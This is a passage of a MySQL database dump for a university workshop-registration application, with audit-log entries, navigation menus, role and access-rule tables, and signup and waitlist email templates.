) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=805 ;

--
-- Dumping data for table `oit_tbl_ot_log`
--

INSERT INTO `oit_tbl_ot_log` (`logId`, `accountId`, `role`, `request`, `sid`, `timestamp`, `message`, `priority`, `priorityName`, `attributeName`, `attributeId`) VALUES
(744, 2354, '3', '/login/', '8ib97lbpfer7ed9scpk9di4e74', 1242225808, 'User Logged In', 6, 'INFO', 'accountId', '2354'),
(745, 2285, '2', '/login', 'rqum6mrr6q3lkut9g75ncel290', 1242406254, 'User Logged In', 6, 'INFO', 'accountId', '2285'),
(746, 2294, '3', '/login', 'eqcdme4mpbjobguakkv8hq9422', 1242671183, 'User Logged In', 6, 'INFO', 'accountId', '2294'),
(747, 2354, '3', '/workshop/instructor/contact/?eventId=306', '8ecu17jc1jorsvbj82pff95sr2', 1242673315, 'User Logged In', 6, 'INFO', 'accountId', '2354'),
(748, 2294, '3', '/admin/cache/clear', 'eqcdme4mpbjobguakkv8hq9422', 1242674590, 'Cache was cleared', 6, 'INFO', 'appConfig', '0'),
(749, 2294, '3', '/admin/cache/clear', 'eqcdme4mpbjobguakkv8hq9422', 1242674663, 'Cache was cleared', 6, 'INFO', 'appConfig', '0'),
(750, 2294, '3', '/admin/cache/clear', 'eqcdme4mpbjobguakkv8hq9422', 1242674669, 'Cache was cleared', 6, 'INFO', 'appConfig', '0'),
(751, 2294, '3', '/admin/cache/clear', 'eqcdme4mpbjobguakkv8hq9422', 1242675133, 'Cache was cleared', 6, 'INFO', 'appConfig', '0'),
(752, 2294, '3', '/login', 'hhtbbure3ngql52a13b9b8tqh5', 1243430393, 'User Logged In', 6, 'INFO', 'accountId', '2294'),
(753, 2294, '3', '/login/', '1qnfofaaojg6v3quhqpn1spof3', 1245172429, 'User Logged In', 6, 'INFO', 'accountId', '2294'),
(754, 2294, '3', '/admin/acl/application-access/?roleId=15', '1qnfofaaojg6v3quhqpn1spof3', 1245172747, 'Role authUser was modified', 6, 'INFO', 'accessRole', '15'),
(755, 2294, '3', '/admin/trigger/edit/?triggerActionId=20', '1qnfofaaojg6v3quhqpn1spof3', 1245173156, 'Trigger Action modified', 6, 'INFO', 'triggerActionId', '20'),
(756, 2294, '3', '/admin/trigger/edit/?triggerActionId=94', '1qnfofaaojg6v3quhqpn1spof3', 1245173173, 'Trigger Action modified', 6, 'INFO', 'triggerActionId', '94'),
(757, 2294, '3', '/login/', '2pi1f6afe1uh9lk1oi7vqgic00', 1245176710, 'User Logged In', 6, 'INFO', 'accountId', '2294'),
(758, 2294, '3', '/admin/config/', 'ha8qju1o2hsl5a7sqbuipp9tm4', 1245183251, 'User Logged In', 6, 'INFO', 'accountId', '2294'),
(759, 2294, '3', '/admin/config/edit/?key=customTheme', 'ha8qju1o2hsl5a7sqbuipp9tm4', 1245183260, 'User config was edited', 6, 'INFO', 'userConfig', 'customTheme'),
(760, 2294, '3', '/login/', '1qnfofaaojg6v3quhqpn1spof3', 1245243914, 'User Logged In', 6, 'INFO', 'accountId', '2294'),
(761, 2294, '3', '/admin/config/edit/?key=customTheme', '1qnfofaaojg6v3quhqpn1spof3', 1245243932, 'User config was edited', 6, 'INFO', 'userConfig', 'customTheme'),
(762, 2294, '3', '/admin/config/edit/?key=customTheme', '1qnfofaaojg6v3quhqpn1spof3', 1245243973, 'User config was edited', 6, 'INFO', 'userConfig', 'customTheme'),
(763, 2294, '3', '/login/', '1qnfofaaojg6v3quhqpn1spof3', 1247075529, 'User Logged In', 6, 'INFO', 'accountId', '2294'),
(764, 2294, '3', '/admin/maintenance/toggle?status=on', '1qnfofaaojg6v3quhqpn1spof3', 1247075537, 'Application was put into maintenance mode', 6, 'INFO', 'appConfig', '0'),
(765, 2294, '3', '/login', '1qnfofaaojg6v3quhqpn1spof3', 1247075582, 'User Logged In', 6, 'INFO', 'accountId', '2294'),
(766, 2294, '3', '/admin/maintenance/toggle?status=off', '1qnfofaaojg6v3quhqpn1spof3', 1247075599, 'Application was taken out of maintenance mode', 6, 'INFO', 'appConfig', '0'),
(767, 2294, '3', '/login/', '7mq9cddotsvje7cdvfi93jg8v1', 1248114833, 'User Logged In', 6, 'INFO', 'accountId', '2294'),
(768, 2294, '3', '/admin/config/edit/?key=customTheme', '7mq9cddotsvje7cdvfi93jg8v1', 1248114851, 'User config was edited', 6, 'INFO', 'userConfig', 'customTheme'),
(769, 2294, '3', '/login', '7mq9cddotsvje7cdvfi93jg8v1', 1248114933, 'User Logged In', 6, 'INFO', 'accountId', '2294'),
(770, 2294, '3', '/login/', '7mq9cddotsvje7cdvfi93jg8v1', 1248114954, 'User Logged In', 6, 'INFO', 'accountId', '2294'),
(771, 2354, '3', '/login/', 'fjb1b7jllcba5l6e9ld9kb0vd0', 1248723327, 'User Logged In', 6, 'INFO', 'accountId', '2354'),
(772, 2354, '3', '/admin/config/edit/?key=fileUploadPathWorkshop', 'fjb1b7jllcba5l6e9ld9kb0vd0', 1248723401, 'User config was edited', 6, 'INFO', 'userConfig', 'fileUploadPathWorkshop'),
(773, 2294, '3', '/login/', '4ahkdsq4lljepetltnui27i7p3', 1252605905, 'User Logged In', 6, 'INFO', 'accountId', '2294'),
(774, 2294, '3', '/admin/config/edit/?key=customTheme', '4ahkdsq4lljepetltnui27i7p3', 1252605928, 'User config was edited', 6, 'INFO', 'userConfig', 'customTheme'),
(775, 2294, '3', '/admin/config/edit/?key=customTheme', '4ahkdsq4lljepetltnui27i7p3', 1252605954, 'User config was edited', 6, 'INFO', 'userConfig', 'customTheme'),
(776, 2354, '3', '/login/', 'u03upbffisqqid4jcd6t08ma11', 1254491574, 'User Logged In', 6, 'INFO', 'accountId', '2354'),
(777, 2354, '3', '/admin/cron/toggle/?name=all', 'u03upbffisqqid4jcd6t08ma11', 1254492177, 'cron was set to enabled', 6, 'INFO', 'cronName', 'all'),
(778, 2294, '3', '/login/', 'r1ibr0b1gbi96kb6ialja8h2d3', 1254511946, 'User Logged In', 6, 'INFO', 'accountId', '2294'),
(779, 2942, '15', '/login', 'cntjepq73qjn46cmk9mbhq20r2', 1254860125, 'User Logged In', 6, 'INFO', 'accountId', '2942'),
(780, 2294, '3', '/login', 'e1ca4tvlpeq02tnamgun6i8sm0', 1254860165, 'User Logged In', 6, 'INFO', 'accountId', '2294'),
(781, 2942, '15', '/index/', 'cntjepq73qjn46cmk9mbhq20r2', 1254860227, 'Account was modified.', 6, 'INFO', 'accountId', '2942'),
(782, 2294, '3', '/account/index/edit/?accountId=2942', 'e1ca4tvlpeq02tnamgun6i8sm0', 1254860287, 'Account was modified.', 6, 'INFO', 'accountId', '2942'),
(783, 2942, '3', '/admin/config/edit/?key=customTheme', 'cntjepq73qjn46cmk9mbhq20r2', 1254860366, 'Key was reset to default', 6, 'INFO', 'userConfig', 'customTheme'),
(784, 2354, '3', '/cron/index/workshop-evaluation-reminder/', 'cnuu5rkl6m1nilehsf9l712a21', 1255703503, 'User Logged In', 6, 'INFO', 'accountId', '2354'),
(785, 2294, '3', '/cron/index/workshop-evaluation-reminder', 'badpb5grvjr8792q4dhecrqgl3', 1256216253, 'User Logged In', 6, 'INFO', 'accountId', '2294'),
(786, 2294, '3', '/admin/acl/application-access/?roleId=1', 'badpb5grvjr8792q4dhecrqgl3', 1256216333, 'Role guest was modified', 6, 'INFO', 'accessRole', '1'),
(787, 2294, '3', '/admin/acl/application-access/?roleId=1', 'badpb5grvjr8792q4dhecrqgl3', 1256216356, 'Role guest was modified', 6, 'INFO', 'accessRole', '1'),
(788, 1, '2', '/login/', 'fac0ht9gjnrnkuelrn8kl500b1', 1262979058, 'User Logged In', 6, 'INFO', 'accountId', '1'),
(789, 1, '2', '/login/', '0ui8ot8v4c4jd30fl4bgqi9o33', 1263218442, 'User Logged In', 6, 'INFO', 'accountId', '1'),
(790, 1, '2', '/login', 'oatevvetsnu2pjj0j4bmjfnhq6', 1263240174, 'User Logged In', 6, 'INFO', 'accountId', '1'),
(791, 1, '2', '/ot/cache/clear', '0ui8ot8v4c4jd30fl4bgqi9o33', 1263303768, 'Cache was cleared', 6, 'INFO', 'appConfig', '0'),
(792, 1, '2', '/workshop/index/add-document/?workshopId=43', '0ui8ot8v4c4jd30fl4bgqi9o33', 1263306696, 'Document was added', 6, 'INFO', 'workshopId', '43'),
(793, 1, '2', '/workshop/index/delete-document/?workshopDocumentId=219', '0ui8ot8v4c4jd30fl4bgqi9o33', 1263306742, 'Document was deleted', 6, 'INFO', 'workshopId', '43'),
(794, 1, '2', '/workshop/index/delete-document/?workshopDocumentId=218', '0ui8ot8v4c4jd30fl4bgqi9o33', 1263306754, 'Document was deleted', 6, 'INFO', 'workshopId', '43'),
(795, 1, '2', '/workshop/index/delete-document/?workshopDocumentId=251', '0ui8ot8v4c4jd30fl4bgqi9o33', 1263306776, 'Document was deleted', 6, 'INFO', 'workshopId', '43'),
(796, 1, '2', '/workshop/index/delete-document/?workshopDocumentId=217', '0ui8ot8v4c4jd30fl4bgqi9o33', 1263307220, 'Document was deleted', 6, 'INFO', 'workshopId', '43'),
(797, 1, '2', '/workshop/index/add-document/?workshopId=43', '0ui8ot8v4c4jd30fl4bgqi9o33', 1263307262, 'Document was added', 6, 'INFO', 'workshopId', '43'),
(798, 1, '2', '/login', '9p5qj2tsgfq5964eaivpg8q6n0', 1263563514, 'User Logged In', 6, 'INFO', 'accountId', '1'),
(799, 1, '2', '/workshop/signup/index/eventId/311', '9p5qj2tsgfq5964eaivpg8q6n0', 1263563737, 'User Logged In', 6, 'INFO', 'accountId', '1'),
(800, 1, '2', '/account/edit/accountId/1', '9p5qj2tsgfq5964eaivpg8q6n0', 1263563788, 'Account was modified.', 6, 'INFO', 'accountId', '1'),
(801, 1, '2', '/ot/nav/save', '9p5qj2tsgfq5964eaivpg8q6n0', 1263565254, 'Navigation structure modified', 6, 'INFO', 'navigation', 'modified'),
(802, 1, '2', '/ot/nav/save', '9p5qj2tsgfq5964eaivpg8q6n0', 1263565489, 'Navigation structure modified', 6, 'INFO', 'navigation', 'modified'),
(803, 1, '2', '/ot/nav/save', '9p5qj2tsgfq5964eaivpg8q6n0', 1263566196, 'Navigation structure modified', 6, 'INFO', 'navigation', 'modified'),
(804, 1, '2', '/ot/nav/save', '9p5qj2tsgfq5964eaivpg8q6n0', 1263566235, 'Navigation structure modified', 6, 'INFO', 'navigation', 'modified');

-- --------------------------------------------------------

--
-- Table structure for table `oit_tbl_ot_nav`
--

CREATE TABLE IF NOT EXISTS `oit_tbl_ot_nav` (
  `id` int(11) NOT NULL DEFAULT '0',
  `parent` int(11) NOT NULL DEFAULT '0',
  `display` varchar(255) NOT NULL DEFAULT '',
  `module` varchar(255) NOT NULL DEFAULT '',
  `controller` varchar(255) NOT NULL DEFAULT '',
  `action` varchar(255) NOT NULL DEFAULT '',
  `link` varchar(255) NOT NULL DEFAULT '',
  `target` varchar(64) NOT NULL DEFAULT '',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Dumping data for table `oit_tbl_ot_nav`
--

INSERT INTO `oit_tbl_ot_nav` (`id`, `parent`, `display`, `module`, `controller`, `action`, `link`, `target`) VALUES
(1, 0, 'Home', 'default', 'index', 'index', 'index/', '_self'),
(2, 0, 'My Events', 'default', 'index', 'history', 'index/history/', '_self'),
(3, 0, 'Schedule', 'workshop', 'schedule', 'index', 'workshop/schedule', '_self'),
(4, 0, 'Workshops', 'workshop', 'index', 'index', 'workshop/', '_self'),
(5, 4, 'Add Workshop', 'workshop', 'index', 'add', 'workshop/index/add/', '_self'),
(6, 4, 'Teaching Labs', 'workshop', 'location', 'index', 'workshop/location/', '_self'),
(7, 0, 'Admin', 'ot', 'index', 'index', '', ''),
(8, 7, 'Access', 'ot', 'index', 'index', '', '_blank'),
(9, 8, 'Registered Applications', 'ot', 'oauth', 'all-consumers', 'ot/oauth/all-consumers', '_self'),
(10, 8, 'Users', 'ot', 'account', 'all', 'ot/account/all', '_self'),
(11, 8, 'User Access Roles', 'ot', 'acl', 'index', 'ot/acl/index', '_self'),
(12, 7, 'Configuration', 'ot', 'index', 'index', '', ''),
(13, 12, 'App Config', 'ot', 'config', 'index', 'ot/config/index', '_self'),
(14, 12, 'App Triggers', 'ot', 'trigger', 'index', 'ot/trigger/index', '_self'),
(15, 12, 'Authentication Types', 'ot', 'auth', 'index', 'ot/auth', '_self'),
(16, 12, 'Custom Fields', 'ot', 'custom', 'index', 'ot/custom/index', '_self'),
(17, 12, 'Debug Mode', 'ot', 'debug', 'index', 'ot/debug', '_self'),
(18, 12, 'Maintenance Mode', 'ot', 'maintenance', 'index', 'ot/maintenance', '_self'),
(19, 12, 'Navigation Editor', 'ot', 'nav', 'index', 'ot/nav/index', '_self'),
(20, 12, 'Themes', 'ot', 'theme', 'index', 'ot/theme', '_self'),
(21, 7, 'Bug Reports', 'ot', 'bug', '', 'ot/bug', '_self'),
(22, 7, 'Caching', 'ot', 'cache', '', 'ot/cache', '_self'),
(23, 7, 'Cron Jobs', 'ot', 'cron', 'index', 'ot/cron/index', '_self'),
(24, 7, 'Database Backup', 'ot', 'backup', '', 'ot/backup', '_self'),
(25, 7, 'Email Queue', 'ot', 'emailqueue', 'index', 'ot/emailqueue/index', '_self'),
(26, 7, 'Logs', 'ot', 'log', 'index', 'ot/log/index', '_self'),
(27, 7, 'Reporting', 'reporting', 'index', 'index', 'reporting', '_self'),
(28, 7, 'Search Re-Indexing', 'search', 'index', 'reindex', 'search/index/reindex/', '_self'),
(29, 7, 'Version Information', 'ot', 'index', 'index', 'ot/index/index', '_self');

-- --------------------------------------------------------

--
-- Table structure for table `oit_tbl_ot_oauth_client_token`
--

CREATE TABLE IF NOT EXISTS `oit_tbl_ot_oauth_client_token` (
  `consumerId` varchar(32) NOT NULL DEFAULT '',
  `accountId` int(10) unsigned NOT NULL DEFAULT '0',
  `token` varchar(255) NOT NULL DEFAULT '',
  `tokenSecret` varchar(255) NOT NULL DEFAULT '',
  `tokenType` enum('request','access') NOT NULL DEFAULT 'request',
  PRIMARY KEY (`consumerId`,`accountId`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Dumping data for table `oit_tbl_ot_oauth_client_token`
--


-- --------------------------------------------------------

--
-- Table structure for table `oit_tbl_ot_oauth_server_consumer`
--

CREATE TABLE IF NOT EXISTS `oit_tbl_ot_oauth_server_consumer` (
  `consumerId` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(128) NOT NULL DEFAULT '',
  `imageId` int(10) unsigned NOT NULL DEFAULT '0',
  `description` text NOT NULL,
  `website` varchar(255) NOT NULL DEFAULT '',
  `registeredAccountId` int(10) unsigned NOT NULL DEFAULT '0',
  `callbackUrl` varchar(255) NOT NULL DEFAULT '',
  `consumerKey` varchar(255) NOT NULL DEFAULT '',
  `consumerSecret` varchar(255) NOT NULL DEFAULT '',
  PRIMARY KEY (`consumerId`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;

--
-- Dumping data for table `oit_tbl_ot_oauth_server_consumer`
--


-- --------------------------------------------------------

--
-- Table structure for table `oit_tbl_ot_oauth_server_nonce`
--

CREATE TABLE IF NOT EXISTS `oit_tbl_ot_oauth_server_nonce` (
  `nonceId` int(11) NOT NULL AUTO_INCREMENT,
  `consumerId` int(11) NOT NULL DEFAULT '0',
  `token` varchar(128) CHARACTER SET utf8 COLLATE utf8_bin NOT NULL DEFAULT '',
  `timestamp` bigint(20) NOT NULL DEFAULT '0',
  `nonce` varchar(128) CHARACTER SET utf8 COLLATE utf8_bin NOT NULL DEFAULT '',
  PRIMARY KEY (`nonceId`),
  UNIQUE KEY `osn_consumer_key` (`consumerId`,`token`,`timestamp`,`nonce`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;

--
-- Dumping data for table `oit_tbl_ot_oauth_server_nonce`
--


-- --------------------------------------------------------

--
-- Table structure for table `oit_tbl_ot_oauth_server_token`
--

CREATE TABLE IF NOT EXISTS `oit_tbl_ot_oauth_server_token` (
  `tokenId` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `consumerId` int(10) unsigned NOT NULL DEFAULT '0',
  `accountId` int(10) unsigned NOT NULL DEFAULT '0',
  `token` varchar(128) NOT NULL DEFAULT '',
  `tokenSecret` varchar(128) NOT NULL DEFAULT '',
  `tokenType` enum('request','access') NOT NULL DEFAULT 'request',
  `requestDt` int(10) unsigned NOT NULL DEFAULT '0',
  `authorized` tinyint(1) NOT NULL DEFAULT '0',
  PRIMARY KEY (`tokenId`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;

--
-- Dumping data for table `oit_tbl_ot_oauth_server_token`
--


-- --------------------------------------------------------

--
-- Table structure for table `oit_tbl_ot_role`
--

CREATE TABLE IF NOT EXISTS `oit_tbl_ot_role` (
  `roleId` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(64) NOT NULL DEFAULT '',
  `inheritRoleId` int(10) unsigned NOT NULL DEFAULT '0',
  `editable` tinyint(1) NOT NULL DEFAULT '0',
  PRIMARY KEY (`roleId`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=16 ;

--
-- Dumping data for table `oit_tbl_ot_role`
--

INSERT INTO `oit_tbl_ot_role` (`roleId`, `name`, `inheritRoleId`, `editable`) VALUES
(1, 'guest', 0, 1),
(2, 'administrator', 0, 0),
(3, 'oit_ot_staff', 0, 0),
(15, 'authUser', 1, 1);

-- --------------------------------------------------------

--
-- Table structure for table `oit_tbl_ot_role_rule`
--

CREATE TABLE IF NOT EXISTS `oit_tbl_ot_role_rule` (
  `ruleId` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `roleId` int(11) NOT NULL DEFAULT '0',
  `type` enum('allow','deny') NOT NULL DEFAULT 'allow',
  `resource` varchar(64) NOT NULL DEFAULT '',
  `privilege` varchar(64) NOT NULL DEFAULT '',
  `scope` enum('application','remote') NOT NULL DEFAULT 'application',
  PRIMARY KEY (`ruleId`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=176 ;

--
-- Dumping data for table `oit_tbl_ot_role_rule`
--

INSERT INTO `oit_tbl_ot_role_rule` (`ruleId`, `roleId`, `type`, `resource`, `privilege`, `scope`) VALUES
(8, 2, 'allow', '*', '*', 'application'),
(9, 3, 'allow', '*', '*', 'application'),
(46, 14, 'allow', 'admin_acl', 'index', 'application'),
(47, 14, 'allow', 'admin_bug', 'index', 'application'),
(48, 14, 'allow', 'admin_nav', 'index', 'application'),
(49, 14, 'allow', 'admin_translate', '*', 'application'),
(50, 14, 'allow', 'default_index', '*', 'application'),
(51, 14, 'allow', 'error_error', '*', 'application'),
(52, 14, 'allow', 'login_index', '*', 'application'),
(93, 1, 'allow', 'getVersions', '*', 'remote'),
(94, 1, 'deny', 'getConfigOption', '*', 'remote'),
(95, 1, 'deny', 'getMyAccount', '*', 'remote'),
(96, 1, 'deny', 'updateMyAccount', '*', 'remote'),
(97, 1, 'deny', 'getAccount', '*', 'remote'),
(98, 1, 'deny', 'updateAccount', '*', 'remote'),
(99, 1, 'deny', 'getCronJobs', '*', 'remote'),
(100, 1, 'deny', 'setCronJobStatus', '*', 'remote'),
(101, 1, 'deny', 'getBugReports', '*', 'remote'),
(102, 1, 'deny', 'describe', '*', 'remote'),
(118, 15, 'allow', 'account_index', 'add', 'application'),
(119, 15, 'allow', 'account_index', 'change-password', 'application'),
(120, 15, 'allow', 'account_index', 'edit', 'application'),
(121, 15, 'allow', 'account_index', 'index', 'application'),
(122, 15, 'allow', 'default_index', '*', 'application'),
(123, 15, 'allow', 'workshop_evaluate', '*', 'application'),
(124, 15, 'allow', 'workshop_index', 'add-document', 'application'),
(125, 15, 'allow', 'workshop_index', 'add-link', 'application'),
(126, 15, 'allow', 'workshop_index', 'delete-document', 'application'),
(127, 15, 'allow', 'workshop_index', 'delete-link', 'application'),
(128, 15, 'allow', 'workshop_index', 'edit', 'application'),
(129, 15, 'allow', 'workshop_index', 'edit-document', 'application'),
(130, 15, 'allow', 'workshop_index', 'edit-link', 'application'),
(131, 15, 'allow', 'workshop_instructor', 'add-attendee', 'application'),
(132, 15, 'allow', 'workshop_instructor', 'contact', 'application'),
(133, 15, 'allow', 'workshop_instructor', 'evaluation-results', 'application'),
(134, 15, 'allow', 'workshop_instructor', 'index', 'application'),
(135, 15, 'allow', 'workshop_instructor', 'print-signup-sheet', 'application'),
(136, 15, 'allow', 'workshop_instructor', 'promote-attendee', 'application'),
(137, 15, 'allow', 'workshop_instructor', 'remove-attendee', 'application'),
(138, 15, 'allow', 'workshop_instructor', 'take-roll', 'application'),
(139, 15, 'allow', 'workshop_schedule', 'edit-event', 'application'),
(140, 15, 'allow', 'workshop_signup', 'cancel', 'application'),
(141, 15, 'allow', 'workshop_signup', 'index', 'application'),
(142, 15, 'allow', 'workshop_signup', 'reserve', 'application'),
(159, 1, 'allow', 'api_index', '*', 'application'),
(160, 1, 'allow', 'cron_index', '*', 'application'),
(161, 1, 'allow', 'default_index', 'index', 'application'),
(162, 1, 'allow', 'default_migration', '*', 'application'),
(163, 1, 'allow', 'error_error', '*', 'application'),
(164, 1, 'allow', 'login_index', '*', 'application'),
(165, 1, 'allow', 'search_index', 'tag', 'application'),
(166, 1, 'allow', 'workshop_index', 'details', 'application'),
(167, 1, 'allow', 'workshop_index', 'download-document', 'application'),
(168, 1, 'allow', 'workshop_index', 'download-handouts', 'application'),
(169, 1, 'allow', 'workshop_index', 'index', 'application'),
(170, 1, 'allow', 'workshop_index', 'workshop-list', 'application'),
(171, 1, 'allow', 'workshop_location', 'details', 'application'),
(172, 1, 'allow', 'workshop_location', 'index', 'application'),
(173, 1, 'allow', 'workshop_schedule', 'event-details', 'application'),
(174, 1, 'allow', 'workshop_schedule', 'get-events', 'application'),
(175, 1, 'allow', 'workshop_schedule', 'index', 'application');

-- --------------------------------------------------------

--
-- Table structure for table `oit_tbl_ot_trigger_action`
--

CREATE TABLE IF NOT EXISTS `oit_tbl_ot_trigger_action` (
  `triggerActionId` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `triggerId` varchar(64) NOT NULL DEFAULT '',
  `name` varchar(64) NOT NULL DEFAULT '',
  `helper` varchar(64) NOT NULL DEFAULT '',
  `enabled` tinyint(1) NOT NULL DEFAULT '1',
  PRIMARY KEY (`triggerActionId`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=106 ;

--
-- Dumping data for table `oit_tbl_ot_trigger_action`
--

INSERT INTO `oit_tbl_ot_trigger_action` (`triggerActionId`, `triggerId`, `name`, `helper`, `enabled`) VALUES
(14, 'Login_Index_Signup', 'Signup for an account', 'Ot_Trigger_Plugin_Email', 1),
(15, 'Login_Index_Forgot', 'User forgot password', 'Ot_Trigger_Plugin_Email', 1),
(16, 'Admin_Account_Create_Password', 'Admin created account', 'Ot_Trigger_Plugin_Email', 1),
(17, 'Admin_Account_Create_NoPassword', 'When a WRAP account gets created', 'Ot_Trigger_Plugin_Email', 1),
(18, 'User_Automatically_Moved_From_Waitlist_To_Attending', 'Student Email', 'Ot_Trigger_Plugin_EmailQueue', 1),
(19, 'User_Automatically_Moved_From_Waitlist_To_Attending', 'Instructor Email', 'Ot_Trigger_Plugin_EmailQueue', 1),
(20, 'Instructor_Cancels_Users_Reservation', 'Instructor canceled student registration', 'Ot_Trigger_Plugin_EmailQueue', 1),
(21, 'Instructor_Registered_User', 'Email to Student', 'Ot_Trigger_Plugin_EmailQueue', 1),
(22, 'Instructor_Registered_User_For_Waitlist', 'Email to Student', 'Ot_Trigger_Plugin_EmailQueue', 1),
(23, 'Instructor_Promote_User_Waitlist_To_Attending', 'Email to Student', 'Ot_Trigger_Plugin_EmailQueue', 1),
(87, 'Event_Signup', 'Sign up for an Event', 'Ot_Trigger_Plugin_EmailQueue', 1),
(88, 'Event_Signup_Waitlist', 'You are on the wait list', 'Ot_Trigger_Plugin_EmailQueue', 1),
(89, 'Event_Signup', 'Instructor notification', 'Ot_Trigger_Plugin_EmailQueue', 1),
(90, 'Event_Cancel_Reservation', 'Student Cancel', 'Ot_Trigger_Plugin_EmailQueue', 1),
(91, 'Event_Cancel_Reservation', 'Instructor notification', 'Ot_Trigger_Plugin_EmailQueue', 1),
(92, 'Event_Waitlist_To_Attending', 'Student Email', 'Ot_Trigger_Plugin_EmailQueue', 1),
(93, 'Event_Waitlist_To_Attending', 'Instructor notification', 'Ot_Trigger_Plugin_EmailQueue', 1),
(94, 'Instructor_Cancels_Users_Reservation', 'instructor canceled student registration', 'Ot_Trigger_Plugin_EmailQueue', 1),
(95, 'Instructor_Registered_User', 'student email', 'Ot_Trigger_Plugin_EmailQueue', 1),
(96, 'Instructor_Registered_User_For_Waitlist', 'student email', 'Ot_Trigger_Plugin_EmailQueue', 1),
(97, 'Instructor_Promote_User_Waitlist_To_Attending', 'Student email', 'Ot_Trigger_Plugin_EmailQueue', 1),
(98, 'Event_Signup_Waitlist', 'Instructor notification', 'Ot_Trigger_Plugin_EmailQueue', 1),
(99, 'Workshop_Add', 'WorkshopAdded', 'Ot_Trigger_Plugin_EmailQueue', 1),
(100, 'Event_Attendee_Final_Reminder', 'final email', 'Ot_Trigger_Plugin_EmailQueue', 1),
(101, 'Event_Attendee_First_Reminder', 'first email', 'Ot_Trigger_Plugin_EmailQueue', 1),
(102, 'Event_Evaluation_Reminder', 'evaluation reminder', 'Ot_Trigger_Plugin_EmailQueue', 1),
(103, 'Event_Instructor_Final_Reminder', 'instructor notification', 'Ot_Trigger_Plugin_EmailQueue', 1),
(104, 'Event_Instructor_First_Reminder', 'instructor notification', 'Ot_Trigger_Plugin_EmailQueue', 1),
(105, 'Event_LowAttendance', 'Instructor notification', 'Ot_Trigger_Plugin_EmailQueue', 1);

-- --------------------------------------------------------

--
-- Table structure for table `oit_tbl_ot_trigger_helper_email`
--

CREATE TABLE IF NOT EXISTS `oit_tbl_ot_trigger_helper_email` (
  `triggerActionId` int(11) NOT NULL DEFAULT '0',
  `to` varchar(255) NOT NULL DEFAULT '',
  `from` varchar(255) NOT NULL DEFAULT '',
  `subject` varchar(255) NOT NULL DEFAULT '',
  `body` text NOT NULL,
  PRIMARY KEY (`triggerActionId`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `oit_tbl_ot_trigger_helper_email`
--

INSERT INTO `oit_tbl_ot_trigger_helper_email` (`triggerActionId`, `to`, `from`, `subject`, `body`) VALUES
(14, '[[emailAddress]]', 'webapps_admin@ncsu.edu', 'Thanks for signing up!', 'Hey [[firstName]]!  Welcome to The System.\r\n\r\nYour user id:  [[username]]\r\nYou password: [[password]]'),
(15, '[[emailAddress]]', 'admin@webapps.ncsu.edu', 'Your password has been reset', 'Thanks [[firstName]] [[lastName]]\r\n\r\nYou password for [[username]] has been reset.  Go here [[resetUrl]] to change your password.'),
(16, '[[emailAddress]]', 'admin@webapps.ncsu.edu', 'You''ve been given an account', 'Hey [[firstName]], You''ve been given a(n) [[role]] account!\r\n\r\n[[username]]\r\n[[password]]'),
(17, '[[emailAddress]]', 'admin@webapps.ncsu.edu', 'You''ve got a new account!', 'Hey [[firstName]] [[lastName]]\r\n\r\nYou''ve been given a new [[role]] [[loginMethod]] account.\r\n\r\nYour username is [[username]]');

-- --------------------------------------------------------

--
-- Table structure for table `oit_tbl_ot_trigger_helper_emailqueue`
--

CREATE TABLE IF NOT EXISTS `oit_tbl_ot_trigger_helper_emailqueue` (
  `triggerActionId` int(11) NOT NULL DEFAULT '0',
  `to` varchar(255) NOT NULL DEFAULT '',
  `from` varchar(255) NOT NULL DEFAULT '',
  `subject` varchar(255) NOT NULL DEFAULT '',
  `body` text NOT NULL,
  PRIMARY KEY (`triggerActionId`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `oit_tbl_ot_trigger_helper_emailqueue`
--

INSERT INTO `oit_tbl_ot_trigger_helper_emailqueue` (`triggerActionId`, `to`, `from`, `subject`, `body`) VALUES
(18, '[[studentEmail]]', 'classreg@ncsu.edu', 'OIT Workshops Confirmation: [[workshopName]]', 'Dear [[studentFirstName]],\r\n\r\nYou have been moved off of the waitlist and onto the roll for the [[workshopName]] workshop. The details of your workshop registration are below:\r\n\r\n[[workshopName]]\r\n[[workshopDate]] from [[workshopStartTime]] to [[workshopEndTime]]\r\nLocation:  [[locationName]]  ([[locationAddress]])\r\nInstructors:  [[instructorNames]] ([[instructorEmails]])\r\n\r\nParticipants are expected to print and bring a copy of the workshop handouts to class. Workshop materials can be found by clicking the My Appointments link in our Classmate Registration system. If your workshop does not have a link for handouts, any materials for that particular workshop will be provided by the instructor at the time of the class. Thank you in advance for your co-operation.\r\n\r\nYou will receive a reminder prior to the workshop. If you are unable to attend this workshop, please use our online registration system to cancel the workshop from your schedule immediately so that others may register for your seat.\r\n\r\n\r\nNOTE:  If less than [[workshopMinimumEnrollment]] people register for this workshop it may be canceled.  In this event, you will be notified in advance by email.\r\n\r\n-- OIT Training Coordinator\r\nclassreg@ncsu.edu\r\n\r\nTo return to OIT''s Classmate Registration System, click the underlined link below. If your email system does not support URL links, you can copy this link and paste it into your web browser.\r\n\r\nhttp://webapps.ncsu.edu/classmate\r\n\r\nThank You!'),
(19, '[[instructorEmails]]', 'classreg@ncsu.edu', 'Instructor Waitlist Advancement Notification:  [[workshopName]]', '[[instructorNames]],\r\n\r\nThe following student has been moved from the waitlist and onto the class role for "[[workshopName]]":\r\n\r\n[[studentFirstName]] [[studentLastName]]\r\n[[studentEmail]]\r\n\r\nThank You\r\nOIT Education'),
